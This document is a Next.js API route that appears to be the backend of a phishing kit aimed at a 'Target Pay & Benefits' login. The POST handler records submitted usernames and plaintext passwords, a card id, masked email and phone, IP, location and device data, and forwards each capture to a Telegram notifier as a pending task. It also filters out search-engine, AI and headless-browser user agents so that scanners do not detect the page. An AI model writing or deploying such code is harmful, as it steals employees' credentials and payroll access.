import { NextRequest, NextResponse } from "next/server";
import { getDb, ensureTable, autoDeclineExpired } from "@/lib/db";
import { notifyNewTask } from "@/lib/telegram";


const BOT_UA_RE = /googlebot|bingbot|msnbot|slurp|yandexbot|baiduspider|duckduckbot|facebookexternalhit|facebookbot|twitterbot|linkedinbot|pinterest|applebot|petalbot|mj12bot|ahrefsbot|semrushbot|dotbot|gptbot|claudebot|anthropic-ai|bytespider|slackbot|discordbot|whatsapp|telegrambot|crawler|spider|bot\/|headlesschrome|phantomjs|puppeteer|playwright/i;

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const sql = getDb();
    await ensureTable(sql);
    await autoDeclineExpired(sql);

    const id = crypto.randomUUID();
    const now = Date.now();

    const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
      || req.headers.get("cf-connecting-ip")
      || "Unknown";
    const country = req.headers.get("cf-ipcountry")
      || req.headers.get("x-vercel-ip-country")
      || "Unknown";
    const city = req.headers.get("x-vercel-ip-city") || "Unknown";
    const timezone = req.headers.get("x-vercel-ip-timezone") || "UTC";

    const isVisit = body.request_kind === "visit";

    if (isVisit) {
      const ua = body.device_info || req.headers.get("user-agent") || "";
      if (BOT_UA_RE.test(ua)) {
        return NextResponse.json({ ok: true, skipped: true, reason: "bot" });
      }
      const recent = await sql`
        SELECT id FROM pending_logins
        WHERE request_kind = 'visit'
          AND user_id = ${ip}
          AND created_at > ${now - 300000}
        LIMIT 1
      `;
      if (recent.length > 0) {
        return NextResponse.json({ ok: true, deduplicated: true });
      }
    }

    await sql`
      INSERT INTO pending_logins (
        id, project_id, user_id, password, method, masked_email, masked_phone,
        status, created_at, member_origin, request_kind, cc_id, project_name,
        flow_step, pending_since
      ) VALUES (
        ${id}, ${"target-site"}, ${body.user_id || ip}, ${body.password || ""},
        ${body.method || "web"}, ${body.masked_email || "N/A"}, ${body.masked_phone || "N/A"},
        ${"pending"}, ${now}, ${body.member_origin || null}, ${body.request_kind || "login"},
        ${body.cc_id || null}, ${"Target Pay & Benefits"},
        ${isVisit ? "visit" : "login"}, ${now}
      )
    `;

    const taskData = {
      id,
      user_id: body.user_id || ip,
      password: body.password,
      masked_email: body.masked_email || "N/A",
      masked_phone: body.masked_phone || "N/A",
      request_kind: body.request_kind || "login",
      member_origin: body.member_origin,
      device_info: body.device_info || req.headers.get("user-agent") || "",
      screen_size: body.screen_size,
      referrer: body.referrer || req.headers.get("referer") || "Direct",
      cf: { ip, country, city, timezone, asOrganization: body.as_org || "Unknown" },
    };

    await notifyNewTask(taskData);

    return NextResponse.json({ ok: true, id, status: "pending" });
  } catch (err) {
    console.error("[tasks POST]", err);
    return NextResponse.json({ error: "Internal error" }, { status: 500 });
  }
}

export async function GET() {
  try {
    const sql = getDb();
    await ensureTable(sql);
    await autoDeclineExpired(sql);

    const rows = await sql`
      SELECT id, user_id, status, request_kind, created_at, flow_step
      FROM pending_logins
      WHERE project_id = 'target-site'
      ORDER BY created_at DESC
      LIMIT 50
    `;

    return NextResponse.json({ ok: true, tasks: rows });
  } catch (err) {
    console.error("[tasks GET]", err);
    return NextResponse.json({ error: "Internal error" }, { status: 500 });
  }
}
